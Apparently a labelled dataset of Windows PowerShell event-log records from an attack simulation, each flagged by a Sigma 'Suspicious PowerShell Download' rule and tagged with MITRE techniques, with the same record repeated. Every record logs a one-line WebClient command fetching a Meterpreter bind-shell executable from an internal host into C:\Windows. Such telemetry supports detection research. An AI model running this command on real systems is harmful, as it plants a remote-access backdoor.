"falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
